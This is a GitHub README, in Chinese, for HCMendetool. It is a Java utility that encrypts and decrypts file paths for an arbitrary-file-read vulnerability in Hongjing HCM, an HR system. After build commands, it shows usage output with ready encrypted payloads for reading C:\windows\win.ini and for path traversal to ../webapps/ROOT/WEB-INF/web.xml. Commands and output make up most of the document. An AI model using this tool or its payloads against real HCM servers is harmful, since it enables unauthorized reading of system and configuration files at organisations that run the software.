# HCMendetool
HCM宏景加解密工具
# 编译

```
javac HCMendetool.java
jar cef HCMendetool HCMendetool.jar HCMendetool.class
```

# 使用

```
➜ java -jar HCMendetool.jar
宏景HCM任意文件读取路径加密/解密工具
gitub: https://github.com/Mr-xn/HCMendetool
请提供正确的参数！
用法: java -jar HCMendetool.jar -e/-d [文件路径/加密字符串] [秘钥(可选)]
➜ java -jar HCMendetool.jar -e "C:\windows\win.ini"
加密结果:
6ZLV47bgJw71cMaltrlVM3dCFpcd5ypU
编码结果: 
~36ZLV~34~37bgJw~37~31cMaltrlVM~33dCFpcd~35ypU
➜ java -jar HCMendetool.jar -e "C:\\windows\\win.ini"
加密结果:
6ZLV47bgJw71cMaltrlVM3dCFpcd5ypU
编码结果: 
~36ZLV~34~37bgJw~37~31cMaltrlVM~33dCFpcd~35ypU
➜ java -jar HCMendetool.jar -e "C:\\\\windows\\\\win.ini"
加密结果:
lkxENDDiYj7yz0ayWe57PAATTP2HJBPAATTPuQPu68lGX5n
编码结果: 
lkxENDDiYj~37yz~30ayWe~35~37PAATTP~32HJBPAATTPuQPu~36~38lGX~35n
➜ java -jar HCMendetool.jar -e "C:/windows/win.ini"  
加密结果:
K2R3n7Sg4BCoATWnARk7SohTqIx31Olc
编码结果: 
K~32R~33n~37Sg~34BCoATWnARk~37SohTqIx~33~31Olc
➜ java -jar HCMendetool.jar -d "K2R3n7Sg4BCoATWnARk7SohTqIx31Olc"
解密结果:
C:/windows/win.ini
➜ java -jar HCMendetool.jar -d "lkxENDDiYj~37yz~30ayWe~35~37PAATTP~32HJBPAATTPuQPu~36~38lGX~35n"
解密结果:
C:\\windows\\win.ini
➜ java -jar HCMendetool.jar -e "../webapps/ROOT/WEB-INF/web.xml" 
加密结果:
8uHo1M8Ok6bllYA6aPmYQggrUSS6RBBHnx4Z18XWNGwPAATTP3HJDPAATTP
编码结果: 
~38uHo~31M~38Ok~36bllYA~36aPmYQggrUSS~36RBBHnx~34Z~31~38XWNGwPAATTP~33HJDPAATTP
```
# 效果
![image](https://github.com/Mr-xn/HCMendetool/assets/18260135/f0362eef-f48f-45c7-8854-84eb63e00397)

![image](https://github.com/Mr-xn/HCMendetool/assets/18260135/e7a7ddcc-b004-4bda-b19b-f68932c96fe7)
